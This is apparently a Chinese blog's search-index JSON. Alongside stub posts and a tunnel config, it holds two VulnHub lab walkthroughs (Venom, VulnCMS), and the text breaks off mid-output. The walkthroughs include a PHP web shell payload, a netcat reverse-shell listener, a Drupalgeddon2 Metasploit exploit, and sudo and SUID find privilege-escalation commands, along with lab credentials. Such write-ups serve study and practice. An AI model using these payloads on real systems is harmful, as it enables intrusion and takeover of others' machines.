Person(&#x27;why&#x27;);console.log(p); 内置函数的调用绑定","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"openProcess","slug":"openProcess","date":"2023-04-01T11:41:00.000Z","updated":"2023-04-07T14:08:38.858Z","comments":true,"path":"59bbde9c.html","link":"","permalink":"http://example.com/59bbde9c.html","excerpt":"openProcess","text":"openProcess openProcess 释义","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"createProcess","slug":"createProcess","date":"2023-04-01T11:06:25.000Z","updated":"2023-04-01T11:48:29.945Z","comments":true,"path":"e0165a92.html","link":"","permalink":"http://example.com/e0165a92.html","excerpt":"createProcess","text":"createProcess createProcess 释义","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"shadowsocket配置","slug":"shadowsocket配置","date":"2023-04-01T07:08:18.000Z","updated":"2024-06-27T08:16:35.470Z","comments":true,"path":"fc41ab04.html","link":"","permalink":"http://example.com/fc41ab04.html","excerpt":"记录一下shadowsocket的配置为了愉快的使用Google","text":"记录一下shadowsocket的配置为了愉快的使用Google 国内[209]配置 国内[209]配置 server配置[common]bind_port &#x3D; 7001client配置[common]server_addr &#x3D; 127.0.0.1server_port &#x3D; 7000[ssh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 22remote_port &#x3D; 6000 硅谷[184]配置 硅谷[184]配置 新加坡[188]server配置[common]bind_port &#x3D; 7001新加披[188]client配置[common]server_addr &#x3D; 国内[209]server_port &#x3D; 7001[frp_shadow]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8890remote_port &#x3D; 8889[frp_shh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 6002remote_port &#x3D; 6667 新加坡[188]配置 新加坡[188]配置 server配置bind_port &#x3D; 7000新加坡[188]client配置[common]server_addr &#x3D; [硅谷]184server_port &#x3D; 7001[frp_client_188]type &#x3D; tcplocal_ip &#x3D; 1270.0.1local_port &#x3D; 22remote_port &#x3D; 6002[shadowrocket_client_188]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8388remote_port &#x3D; 8890","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"vulnhub-Venom","slug":"vulnhub-Venom","date":"2021-07-31T14:35:00.000Z","updated":"2023-03-25T14:35:06.470Z","comments":true,"path":"64974.html","link":"","permalink":"http://example.com/64974.html","excerpt":"","text":"记录打靶机（Venom）过程参考： https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/ https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/ 主机发现使用arp-scan进行存活IP探测 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.147 00:0c:29:90:08:c7 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.930 seconds (132.64 hosts/sec). 4 responded 经探测可知目标IP为192.168.109.147，接下来对此IP进行端口扫描，尝试获取更多信息 端口扫描1234567891011121314151617181920212223242526272829303132333435363738394041nmap -sC -sV -p- 192.168.109.147 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 09:08 EDTNmap scan report for 192.168.109.147Host is up (0.00032s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.380/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open ssl/https Apache/2.4.29 (Ubuntu)|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: VENOM; OS: UnixHost script results:|_clock-skew: mean: 6h09m59s, deviation: 3h10m31s, median: 7h59m58s|_nbstat: NetBIOS name: VENOM, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: venom| NetBIOS computer name: VENOM\\x00| Domain name: \\x00| FQDN: venom|_ System time: 2021-07-29T02:38:46+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-07-28T21:08:46|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds 经扫描可知目标开放了21（ftp）、80（http）、139（smb）、443（https）、445（smb）等多个端口。 整理一下思路针对不同端口： ftp（21）端口： 尝试匿名用户登录 打岔 ✘ * 漏洞数据库搜索相关版本漏洞，此处版本过高暂没有利用漏洞 打岔 ✘ http（80）端口： 读取源码，尝试获取敏感信息 ✔（此处在做的过程中没有仔细查看，漏掉重要突破口） smb（139、445）端口： 可以尝试使用MSF中ms 07-010进行漏洞探测 ✗ * 枚举SMB服务 ✔ https（443）端口 此端口暂没有什么思路 以上思路经过验证并参考大神思路后得知突破口在http（80）端口 目录扫描12345678910111213141516171819202122dirb http://192.168.109.147:80/ -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 31 11:10:45 2021URL_BASE: http://192.168.109.147:80/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.109.147:80/ ----+ http://192.168.109.147:80/index.html (CODE:200|SIZE:11004) + http://192.168.109.147:80/server-status (CODE:403|SIZE:280) -----------------END_TIME: Sat Jul 31 11:10:48 2021DOWNLOADED: 4612 - FOUND: 2 经扫描index.html返回200，此页面是Ubuntu LogoApache2 Ubuntu Default Page，所以当时没想到查看源码，淦。在源码结尾藏有一段MD5加密的字符串： 解码经解密后得到hostinger,参考网上思路后得知需要枚举SMB服务，小笔记记下，因为对445端口做信息收集还是第一次 枚举SMB服务参考网上使用enum4linux进行枚举 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157enum4linux -a 192.168.109.147Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 28 09:18:59 2021 ========================== | Target Information | ========================== Target ........... 192.168.109.147RID Range ........ 500-550,1000-1050Username ......... &#x27;&#x27;Password ......... &#x27;&#x27;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ======================================================= | Enumerating Workgroup/Domain on 192.168.109.147 | ======================================================= [+] Got domain/workgroup name: WORKGROUP =============================================== | Nbtstat Information for 192.168.109.147 | =============================================== Looking up status of 192.168.109.147 VENOM &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service VENOM &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service VENOM &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ======================================== | Session Check on 192.168.109.147 | ======================================== [+] Server 192.168.109.147 allows sessions using username &#x27;&#x27;, password &#x27;&#x27; ============================================== | Getting domain SID for 192.168.109.147 | ============================================== Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can&#x27;t determine if host is part of domain or part of a workgroup ========================================= | OS information on 192.168.109.147 | ========================================= Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 192.168.109.147 from smbclient: [+] Got OS info for 192.168.109.147 from srvinfo: VENOM Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 ================================ | Users on 192.168.109.147 | ================================ Use of uninitialized value $users in print at ./enum4linux.pl line 874.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.Use of uninitialized value $users in print at ./enum4linux.pl line 888.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890. ============================================ | Share Enumeration on 192.168.109.147 | ============================================ Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (venom server (Samba, Ubuntu))SMB1 disabled -- no workgroup available[+] Attempting to map shares on 192.168.109.147//192.168.109.147/print$ Mapping: DENIED, Listing: N/A//192.168.109.147/IPC$ [E] Can&#x27;t understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ======================================================= | Password Policy Information for 192.168.109.147 | ======================================================= [+] Attaching to 192.168.109.147 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s): [+] VENOM [+] Builtin[+] Password Info for Domain: VENOM [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 ================================= | Groups on 192.168.109.147 | ================================= [+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ========================================================================== | Users on 192.168.109.147 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================== [I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-21-3525385883-4254613925-43684688[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-21-3525385883-4254613925-43684688 and logon username &#x27;&#x27;, password &#x27;&#x27;...skip...[+] Enumerating users using SID S-1-22-1 and logon username &#x27;&#x27;, password &#x27;&#x27;S-1-22-1-1000 Unix User\\nathan (Local User)S-1-22-1-1002 Unix User\\hostinger (Local User) ================================================ | Getting printer info for 192.168.109.147 | ================================================ No printers returned.enum4linux complete on Wed Jul 28 09:19:14 2021 经过枚举可以发现hostinger是使用者之一，结合之前解密的MD5值进行ftp登录 ftp登录123456789101112131415161718192021222324252627ftp 192.168.109.147Connected to 192.168.109.147.220 (vsFTPd 3.0.3)Name (192.168.109.147:kali): hostinger331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 21 23:43 files226 Directory send OK.ftp&gt; cd files250 Directory successfully changed.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 384 May 21 23:43 hint.txt226 Directory send OK.ftp&gt; get hint.txtlocal: hint.txt remote: hint.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for hint.txt (384 bytes).226 Transfer complete.384 bytes received in 0.04 secs (10.3970 kB/s) 可以登录成功，可以发现files目录下存在hint.txt，下载下来查看内容 123456789101112 Hey there... T0D0 --* You need to follow the &#x27;hostinger&#x27; on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=* some knowledge of cipher is required to decode the dora password..* try on venom.boxpassword -- L7f9l8@J#p%Ue+Q1234 -&gt; deocode this you will get the administrator password Have fun .. :) 在hint.txt中存在两段base64编码的字符串 Base64 解码12345echo &#x27;WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=&#x27; | base64 -d | base64 -d | base64 -dstandard vigenere cipher ┌──(kali㉿kali)-[~/Desktop]└─$ echo &#x27;aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=&#x27; | base64 -d https://cryptii.com/pipes/vigenere-cipher 第一段需要解码4次，第二段解码为一个网址 整理信息： 解码bash64得到相关信息 盒子主机名为venom.box1You need to follow the &#x27;hostinger&#x27; on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher 添加主机名到主机文件中，访问域名可得到新的页面，此处参考另一种思路，在https://cryptii.com/pipes/vigenere-cipher可以解密得到dora的密码 登录venom.box此处可以看到版本信息为Subrion CMS 4.2.1在exploit-db中搜索可以得到该版本存在一个文件上传漏洞 漏洞利用通过构造一句话木马上传后以获得shell，根据提示可以得知因为该版本中.htaccess文件中忽略了 .pht、 .phar文件后缀的文件 12cat php-shell.phar &lt;?php system($_GET[cmd]); ?&gt; 成功执行命令 获取shell通过前面上传的一句话木马执行python反向连接shell此时需要监听4444 端口 123456nc -lvp 4444 1 ⨯listening on [any] 4444 ...connect to [192.168.109.140] from venom.box [192.168.109.147] 33098$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获取shell此时是在upload目录的切换到home目录下查看存在用户 123456789cd /homecd /home$ ls -lartls -larttotal 16drwxr-xr-x 24 root root 4096 May 20 10:08 ..drwxr-xr-x 4 root root 4096 May 21 17:00 .drwxr-x--- 17 nathan nathan 4096 May 22 00:21 nathandrwxr-xr-x 16 hostinger hostinger 4096 May 22 13:58 hostinger 使用hostinger/hostinger登录，登录成功后在/var/www/html/subrion/backup下.htaccess文件中存在nathan密码 切换nathan用户，可获取第一个flag 12345678910111213141516su nathansu nathanPassword: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_anathan@venom:/var/www/html/subrion/backup$ ididuid=1000(nathan) gid=1000(nathan) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)nathan@venom:/var/www/html/subrion/backup$ cd cd nathan@venom:~$ lslsDesktop Downloads Music Public user.txtDocuments examples.desktop Pictures Templates Videosnathan@venom:~$ cat user.txtcat user.txtW3_@r3_V3n0m:P 权限提升尝试sudo提权 123456789sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/su 参考得知这里直接运行sudo bash即可提权 1234567891011121314sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/sunathan@venom:~$ sudo bashsudo bashroot@venom:~# ididuid=0(root) gid=0(root) groups=0(root) 第二种方式通过查找设置了SUID位的文件find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051nathan@venom:~$ find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/nullfind / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null-rwsr-xr-x 1 root root 1473576 Apr 20 10:15 /opt/VBoxGuestAdditions-6.1.20/bin/VBoxDRMClient-rwsr-s--- 1 root nathan 238080 Nov 5 2017 /usr/bin/find-rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec-rwsr-xr-x 1 root root 44528 Mar 23 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 59640 Mar 23 2019 /usr/bin/passwd-rwsr-xr-x 1 root root 22528 Jun 28 2019 /usr/bin/arping-rwsr-xr-x 1 root root 75824 Mar 23 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-xr-x 1 root root 40344 Mar 23 2019 /usr/bin/newgrp-rwsr-xr-x 1 root root 76496 Mar 23 2019 /usr/bin/chfn-rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo-rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-- 1 root messagebus 42992 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-sr-x 1 root root 10232 Jul 3 2020 /usr/lib/xorg/Xorg.wrap-rwsr-xr-x 1 root root 113528 Jul 10 2020 /usr/lib/snapd/snap-confine-rwsr-xr-- 1 root dip 378600 Jul 23 2020 /usr/sbin/pppd-rwsr-xr-x 1 root root 43088 Mar 5 2020 /bin/mount-rwsr-xr-x 1 root root 26696 Mar 5 2020 /bin/umount-rwsr-xr-x 1 root root 44664 Mar 23 2019 /bin/su-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 43088 Sep 17 2020 /snap/core18/2066/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/2066/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/2066/bin/su-rwsr-xr-x 1 root root 26696 Sep 17 2020 /snap/core18/2066/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/2066/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/2066/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/2066/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/2066/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/2066/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 19 2021 /snap/core18/2066/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 43088 Mar 5 2020 /snap/core18/1885/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/1885/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/1885/bin/su-rwsr-xr-x 1 root root 26696 Mar 5 2020 /snap/core18/1885/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/1885/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/1885/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/1885/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/1885/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/1885/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 31 2020 /snap/core18/1885/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 110792 Jul 11 2020 /snap/snapd/8542/usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 111080 Apr 24 17:35 /snap/snapd/11841/usr/lib/snapd/snap-confine 这里参考网上思路，使用find进行提权并读取第二个flag 1234567891011121314151617$ pwdpwd/home/nathan$ /usr/bin/find . -exec /bin/sh -p \\; -quit /usr/bin/find . -exec /bin/sh -p \\; -quit# ididuid=1000(nathan) gid=1000(nathan) euid=0(root) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)# cd /root/cd /root/# lslsroot.txt snap# cat root.txtcat root.txt#root_flagH@v3_a_n1c3_l1fe. done 总结 不够细心 没有清晰的渗透步骤，脑子太乱 坚持","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulnhub-VulnCMS","slug":"vulnhub-VulnCMS","date":"2021-07-27T16:42:27.000Z","updated":"2023-03-25T14:35:06.479Z","comments":true,"path":"10746.html","link":"","permalink":"http://example.com/10746.html","excerpt":"","text":"记录打靶机（VulnCMS）过程信息探测主机发现使用arp-scan进行主机IP发现，探测网段中目标主机IP地址。 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.145 00:0c:29:da:98:92 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 4 responded 经探测发现目标IP地址为192.168.109.145，接着使用nmap对该IP地址进行端口扫描 端口扫描 123456789101112131415161718192021222324252627282930313233343536sudo nmap -sC -sV -p- 192.168.109.145[sudo] password for kali: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 12:43 EDTNmap scan report for 192.168.109.145Host is up (0.0014s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)| 256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)|_ 256 fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: W3.CSS Template5000/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: WordPress 5.7.2|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety &amp;#8211; Just another WordPress site8081/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Joomla! - Open Source Content Management| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Home9001/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Drupal 7 (http://drupal.org)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety.webMAC Address: 00:0C:29:DA:98:92 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds 经nmap扫描后发现存在22（ssh）、80（http）、5000（http）、8081（http）、9001（http）因为此靶机除了22（ssh）端口以外其他都是http服务相关的，在漏洞数据库搜索了openssh 7.6后显示存在一个用户名爆破漏洞，但是用处应该不大，因为还需要密码；翻找了其他http服务相关的页面无可用信息（这里主要使用的是目录扫描）。 但是可以从nmap扫描信息中看到在9001端口运行了Drupal 7服务，之前做相关靶机学习时得知此服务存在exp，这里可以使用msfconsole框架进行搜索加载相关exp。这里有点问题，在做的时候因为用错了exp始终无法返回shell，后面参考了网络上相关文章，此处应该使用exploit/unix/webapp/drupal_drupalgeddon2。 漏洞利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677msfconsole `:oDFo:` ./ymM0dayMmy/. -+dHJ5aGFyZGVyIQ==+- `:sm⏣~~Destroy.No.Data~~s:` -+h2~~Maintain.No.Persistence~~h+- `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:` ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/. -++SecKCoin++e.AMd` `.-://///+hbove.913.ElsMNh+- -~/.ssh/id_rsa.Des- `htN01UserWroteMe!- :dopeAW.No&lt;nano&gt;o :is:TЯiKC.sudo-.A: :we&#x27;re.all.alike&#x27;` The.PFYroy.No.D7: :PLACEDRINKHERE!: yxp_cmdshell.Ab0: :msf&gt;exploit -j. :Ns.BOB&amp;ALICEes7: :---srwxrwx:-.` `MS146.52.No.Per: :&lt;script&gt;.Ac816/ sENbove3101.404: :NT_AUTHORITY.Do `T:/shSYSTEM-.N: :09.14.2011.raid /STFU|wall.No.Pr: :hevnsntSurb025N. dNVRGOING2GIVUUP: :#OUTHOUSE- -s: /corykennedyData: :$nmap -oS SSo.6178306Ence: :Awsm.da: /shMTl#beats3o.No.: :Ring0: `dDestRoyREXKC3ta/M: :23d: sSETEC.ASTRONOMYist: /- /yo- .ence.N:()&#123; :|: &amp; &#125;;: `:Shall.We.Play.A.Game?tron/ ```-ooy.if1ghtf0r+ehUser5` ..th3.H1V3.U2VjRFNN.jMh+.` `MjM~~WE.ARE.se~~MMjMs +~KANSAS.CITY&#x27;s~-` J~HAKCERS~./.` .esc:wq!:` +++ATH` ` =[ metasploit v6.0.30-dev ]+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post ]+ -- --=[ 592 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]Metasploit tip: When in a module, use back to go back to the top level promptmsf6 &gt; search DrupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 1 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 2 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 3 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 4 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 5 exploit/unix/webapp/drupal_restws_exec 2016-07-13 excellent Yes Drupal RESTWS Module Remote PHP Code Execution 6 exploit/unix/webapp/drupal_restws_unserialize 2019-02-20 normal Yes Drupal RESTful Web Services unserialize() RCE 7 exploit/unix/webapp/php_xmlrpc_eval 2005-06-29 excellent Yes PHP XML-RPC Arbitrary Code ExecutionInteract with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_evalmsf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.109.145rhosts =&gt; 192.168.109.145msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 9001rport =&gt; 9001msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.109.140:4444 [*] Executing automatic check (disable AutoCheck to override)[+] The target is vulnerable.[*] Sending stage (39282 bytes) to 192.168.109.145[*] Meterpreter session 1 opened (192.168.109.140:4444 -&gt; 192.168.109.145:45078) at 2021-07-27 13:18:40 -0400 利用成功，这里可在misc目录下找到应该存放用户名密码的文件（tyrell.pass），此处也参考了网络上的文章，应该在翻文件时不仔细。。。 读取密码文件 123cat tyrell.passUsername: tyrellPassword: mR_R0bo7_i5_R3@!_ 得到用户名密码后可使用ssh进行连接连接成功后需要提权，此处提权依然使用sudo进行提权 提权 123456sudo -lMatching Defaults entries for tyrell on vuln_cms: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser tyrell may run the following commands on vuln_cms: (root) NOPASSWD: /bin/journalctl 可以看到journalctl运行时不需要验证密码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849sudo journalctl -- Logs begin at Fri 2021-05-28 12:16:41 UTC, end at Tue 2021-07-27 17:31:18 UTC. --May 28 12:16:41 vuln_cms kernel: Linux version 4.15.0-143-generic (buildd@lcy01-amd64-001) (gcc version 7.5.0 (Ubuntu 